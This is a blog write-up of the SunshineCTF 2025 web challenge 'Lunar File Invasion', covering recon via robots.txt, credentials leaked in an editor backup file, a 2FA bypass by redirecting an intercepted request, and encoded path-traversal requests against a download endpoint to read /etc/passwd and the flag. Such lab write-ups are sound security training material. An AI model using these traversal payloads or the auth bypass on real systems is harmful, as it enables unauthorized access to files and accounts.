---
layout: post
title:  "Lunar File Invasion"
date:   2025-09-29 13:19:43 -0400
author: robo.uzi
tags: [ctf]
permalink: /sunshine-2025-lunar-file-invasion/
---
{% raw  %}
**Title:** Lunar File Invasion

**Category:** web

**Author:** alimuhammadsecured

**Description:** We recently started a new CMS, we've had issues with random bots scraping our pages but found a solution with robots! Anyways, besides that there are no new bug fixes. Enjoy our product!

> Fuzzing is NOT allowed for this challenge, doing so will lead to IP rate limiting!

`https://asteroid.sunshinectf.games`

This one is an honorable mention. I didnt get the flag but I made it past the admin login and two factor authentication so Im including it. The solution is still at the bottom. Thanks to @bensonby on discord!

I visit `https://asteroid.sunshinectf.games/`:
```html
<!DOCTYPE html>  
<html lang="en">  
<head>  
 <meta charset="UTF-8" />  
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>  
 <title>Health Check</title>
</head>  
<body>  
  
 <div class="container">  
   <img src="/index/static/AlienHealth.png" alt="Alien Space Illustration">  
   <h2>Lunar File System Health</h2>  
   <div class="status">Status: UP</div>  
   <p>This page securely shows the status of Lunar File System's internal servers.</p>  
 </div>  
  
</body>  
</html>
```

On `https://asteroid.sunshinectf.games/robots.txt` I see this:
```html
# don't need web scrapers scraping these sensitive files:

Disallow: /.gitignore_test
Disallow: /login
Disallow: /admin/dashboard
Disallow: /2FA
```

Visiting `https://asteroid.sunshinectf.games/login?next=%2F2FA` and
`https://asteroid.sunshinectf.games/login?next=%2Fadmin%2Fdashboard` redirects me to `/login` because Im not authenticated yet.

html of `https://asteroid.sunshinectf.games/login`
```html
<!DOCTYPE html>  
<html lang="en">  
<head>  
 <meta charset="UTF-8" />  
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>  
 <title>Lunar Files</title>
</head>  
<body>  
  
 <div class="container">  
   <div class="image-section"></div>  
   <div class="form-section">  
     <h2>Lunar CMS Login</h2>  
     <form method="POST" action="/login">  
       <div class="form-group">  
         <label for="email">Email</label>  
         <input type="email" name="email" id="email" placeholder="admin@example.com" />  
       </div>  
       <div class="form-group">  
         <label for="password">Password</label>  
         <input type="password" name="password" id="password" placeholder="••••••••" />  
       </div>  
       <div class="remember">  
         <input type="checkbox" id="remember" />  
         <label for="remember">Remember Me</label>  
       </div>  
       <input type="hidden" name="csrf_token" value="IjdlMzYxZWM5ZmY1MDdmNGM1ZThjMzJmMWJiOWNjNmE2MTY3YTQzZjMi.aNm4Qw.srzPzR_KS27nuL9lUfr7CcmMb38" />  
       <button class="login-btn" type="submit">Login</button>  
       <div class="status-message"></div>  
     </form>  
   </div>  
 </div>  
  
</body>  
</html>
```

I download `https://asteroid.sunshinectf.games/.gitignore_test`:
```shell
cat gitignore_test  
# this tells the git CLI to ignore these files so they're not pushed to the repos by mistake.  
# this is because Muhammad noticed there were temporary files being stored on the disk when being edited  
# something about EMACs.  
  
# From MUHAMMAD: please make sure to name this .gitignore or it will not work !!!!  
  
# static files are stored in the /static directory.  
/index/static/login.html~  
/index/static/index.html~  
/index/static/error.html~
```

curling `https://asteroid.sunshinectf.games/index/static/login.html~`:
```shell
curl -i https://asteroid.sunshinectf.games/index/static/login.html~  
HTTP/2 200    
server: nginx/1.24.0 (Ubuntu)  
date: Sun, 28 Sep 2025 20:12:53 GMT  
content-type: application/octet-stream  
content-length: 943  
content-disposition: inline; filename=login.html~  
last-modified: Sat, 27 Sep 2025 19:49:22 GMT  
cache-control: no-cache  
etag: "1759002562.3552387-943-3544588756"  
  
<!DOCTYPE html>  
<html lang="en">  
<head>  
   <meta charset="UTF-8">  
   <meta name="viewport" content="width=device-width, initial-scale=1.0">  
   <title>Admin Panel</title>  
</head>  
<body>  
   <div>  
       <img src="" alt="Image of Alien">  
       <form action="{{url_for('index.login')}}" method="POST">  
           <!-- TODO: use proper clean CSS stylesheets bruh -->  
           <p style="color: red;"> {{ err_msg }} </p>  
           <input type="hidden" name="csrf_token" value="{{ csrf_token() }}" />  
           <label for="Email">Email</label>  
           <input value="admin@lunarfiles.muhammadali" type="text" name="email">  
  
           <label for="Password">Password</label>  
           <!-- just to save time while developing, make sure to remove this in prod !  -->  
           <input value="jEJ&(32)DMC<!*###" type="text" name="password">  
           <button type="submit">Login</button>  
       </form>  
   </div>  
</body>  
</html>
```
I find admin login credentials: `admin@lunarfiles.muhammadali:jEJ&(32)DMC<!*###`. They were hardcoded to save time in development. 

`view-source:https://asteroid.sunshinectf.games/2FA`:
```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lunar CMS - Security Verification</title>
</head>

<body>
    <!-- Floating background elements -->
    <div class="bg-element">🔐</div>
    <div class="bg-element">🛡️</div>
    <div class="bg-element">🔑</div>
    <div class="bg-element">⭐</div>
    <div class="bg-element">🌌</div>
    <div class="bg-element">👽</div>
    <div class="container">
        <div class="scanner-line"></div>
        <div class="security-header"> <span class="security-icon">🔐</span>
            <h1 class="security-title">Security Verification</h1>
            <p class="security-subtitle">Lunar CMS Multi-Factor Authentication</p>
        </div>
        <div class="form-container">
            <form action="[/2FA](view-source:https://asteroid.sunshinectf.games/2FA)" method="POST"> <input type="hidden" name="csrf_token" value="IjUxZGQ5NTM4YTI0ZmU0YzA3YjkyZTRkOGE2YjNmNjVhNWRmNjIxYjQi.aNmXEg.tHWI8t8H7lFX12-VTSorm3k5ECU" />
                <div class="pin-section"> <label for="pin" class="pin-label">🔢 Enter 10-Digit Security Pin</label> <input name="pin" id="pin" type="text" class="pin-input" placeholder="0000000000" maxlength="10" pattern="[0-9]{10}" autocomplete="off" required /> </div> <button type="submit" class="validate-btn"> 🚀 Validate Access </button> </form>
        </div>
        <div class="security-info">
            <h4>🛡️ Enhanced Security Protocol</h4>
            <p>This additional verification step protects classified Lunar Society resources from unauthorized galactic entities. Your 10-digit pin was transmitted via secure quantum encryption.</p>
        </div>
    </div>
    <script>
        // Auto-format pin 
        input const pinInput = document.getElementById('pin'); 
        
        pinInput.addEventListener('input', function(e) { 
	        // Remove non-digits 
	        let value = e.target.value.replace(/\D/g, ''); 
	        // Limit to 10 digits 
	        if (value.length > 10) { 
		        value = value.slice(0, 10); 
		        } 
		    e.target.value = value; 
		}); 
		// Add some cosmic sparkles 
		function createSparkle() { 
		const sparkle = document.createElement('div'); 
		sparkle.innerHTML = '✨'; 
		sparkle.style.position = 'absolute'; 
		sparkle.style.left = Math.random() * 100 + 'vw'; 
		sparkle.style.top = Math.random() * 100 + 'vh'; 
		sparkle.style.fontSize = '1rem'; 
		sparkle.style.opacity = '0.6'; 
		sparkle.style.pointerEvents = 'none'; 
		sparkle.style.zIndex = '2'; 
		sparkle.style.animation = `float ${2 + Math.random() * 3}s ease-in-out forwards`; 
		document.body.appendChild(sparkle); 
		setTimeout(() => { 
			sparkle.remove(); 
		}, 5000); 
	} 
	// Create sparkles periodically 
	setInterval(createSparkle, 1500); 
	
	// Focus on pin input when page loads 
	window.addEventListener('load', () => { pinInput.focus(); });
    </script>
</body>

</html>
```

Intercept the request to `/2FA`, change it to `/admin/dashboard` and forward it. This bypasses the two factor authentication. The admin cookie is given before checking for 2FA. Now Im at `https://asteroid.sunshinectf.games/admin/help`.

At `https://asteroid.sunshinectf.games/admin/lunar_files` I see 3 files.

`secret1.txt`:
```
We updated our protections against attackers abusing one of the routes to download files they should not be able to.

The only issue is we're not sure how they keep getting in. Tell Muhammad to fix this janky website bro, what are we paying him our LunarCoins for??

Alimuhammadsecured: yo my bad, I was busy sleeping --_--, we need sleep bro we're not like Y'all.
```

`secret2.txt`:
```
From Muhammad:
so we triggered IR, one of the attackers somehow got their hands on our /etc/passwd file because it's on every Linux machine.

I did some research and a lot of the techniques they did were from Hacktricks website! :(((
```

`secret3.txt`:
```
TODOS:
1) update the .GITIGNORE file
2) Rate SunshineCTF good plez
3) fill out the feedback form when the CTF is over, it's on our discord server ;)
```

After viewing the files I find an endpoint that looks like I can download files from: 
`https://asteroid.sunshinectf.games/admin/download/secret1.txt`

Request 1:
```http
GET /admin/download/secret1.txt HTTP/2
Host: asteroid.sunshinectf.games
Cookie: session=.eJzVT0lqAzEQ_IrQ2QR1S63Fr8g9GNNStzxDHDuMxifjv0chr8ipqA2qnvbcrzwWHfb48bRmn2C_dAy-qD3Y96vyUHO9X8x6M_vdcGvTNPuyDvM9M2_29Dr8k97pMM9uOhZ73LeHTraKPVrBBphqDj36VikqJ6oVKfjsA3skr8VFVmkQK6VAmKSDiyVHkZDBQVOYPQcanCRGzBBcb-RKCi21ABirAkXsqJm9IEUumltmKF1gzj8_hm5_a35pG1s_7_dPvU2BQKSQz4yha2gu1YIaJHOsvkdikh4RarCvH5wrjTw.aNmXEQ.HoncECn_3XLzON44mx9y41AaQNI
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://asteroid.sunshinectf.games/admin/lunar_files
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers
```

Response 1:
```shell
HTTP/2 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Sun, 28 Sep 2025 20:49:39 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 368
Content-Disposition: attachment; filename=secret1.txt
Last-Modified: Sat, 27 Sep 2025 19:49:22 GMT
Cache-Control: no-cache
Etag: "1759002562.345629-368-1899834102"
Vary: Cookie

We updated our protections against attackers abusing one of the routes to download files they should not be able to.

The only issue is we're not sure how they keep getting in. Tell Muhammad to fix this janky website bro, what are we paying him 

our LunarCoins for??

Alimuhammadsecured: yo my bad, I was busy sleeping --_--, we need sleep bro we're not like Y'all.
```

Request 2:
```http
GET /admin/download//etc/passwd HTTP/2
Host: asteroid.sunshinectf.games
Cookie: session=.eJzVT0lqAzEQ_IrQ2QR1S63Fr8g9GNNStzxDHDuMxifjv0chr8ipqA2qnvbcrzwWHfb48bRmn2C_dAy-qD3Y96vyUHO9X8x6M_vdcGvTNPuyDvM9M2_29Dr8k97pMM9uOhZ73LeHTraKPVrBBphqDj36VikqJ6oVKfjsA3skr8VFVmkQK6VAmKSDiyVHkZDBQVOYPQcanCRGzBBcb-RKCi21ABirAkXsqJm9IEUumltmKF1gzj8_hm5_a35pG1s_7_dPvU2BQKSQz4yha2gu1YIaJHOsvkdikh4RarCvH5wrjTw.aNmXEQ.HoncECn_3XLzON44mx9y41AaQNI
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://asteroid.sunshinectf.games/admin/lunar_files
Dnt: 1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers
```

Response 2:
```http
HTTP/2 308 Permanent Redirect
Server: nginx/1.24.0 (Ubuntu)
Date: Sun, 28 Sep 2025 21:09:13 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 283
Location: https://asteroid.sunshinectf.games/admin/download/etc/passwd

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="http://127.0.0.1:25307/admin/download/etc/passwd">http://127.0.0.1:25307/admin/download/etc/passwd</a>. If not, click the link.
```

Redirection:
```http
HTTP/2 302 Found
Server: nginx/1.24.0 (Ubuntu)
Date: Sun, 28 Sep 2025 23:18:48 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 305
Location: /admin/lunar_files?err_msg=%5B+Resource+Does+not+Exist!+%5D
Vary: Cookie

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/admin/lunar_files?err_msg=%5B+Resource+Does+not+Exist!+%5D">/admin/lunar_files?err_msg=%5B+Resource+Does+not+Exist!+%5D</a>. If not, click the link.
```

Im not sure what to do from here. I spent a lot of time on this testing things. No flag :(((((((

Turns out this was the solution: `https://asteroid.sunshinectf.games/admin/download/..%25f.%252f..%252f.%252f..%252fFLAG%252fflag.txt`.

The path is `.././.././../FLAG/flag.txt` which can be found from the source of `app.py` at `.././.././../app.py`
{% endraw %}
